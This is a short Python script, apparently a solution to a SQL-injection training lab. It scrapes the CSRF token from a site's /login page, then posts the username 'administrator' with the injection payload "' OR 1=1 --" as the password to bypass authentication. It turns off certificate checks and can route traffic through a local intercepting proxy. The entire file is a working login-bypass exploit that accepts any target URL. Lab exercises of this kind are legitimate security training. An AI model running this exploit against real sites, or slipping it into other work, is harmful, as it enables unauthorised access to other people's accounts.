from bs4 import BeautifulSoup
from urllib.parse import urljoin

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", type=bool, default=False)
    return parser.parse_args()


def main():
    args = get_args()
    url = urljoin(args.url, "/login")
    proxies = (
        None
        if not args.use_proxy
        else {"http": "http://localhost:8080", "https": "http://localhost:8080"}
    )

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)

    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data={"csrf": csrf, "username": "administrator", "password": "' OR 1=1 --"},
    )
    print(resp.text)


if __name__ == "__main__":
    main()
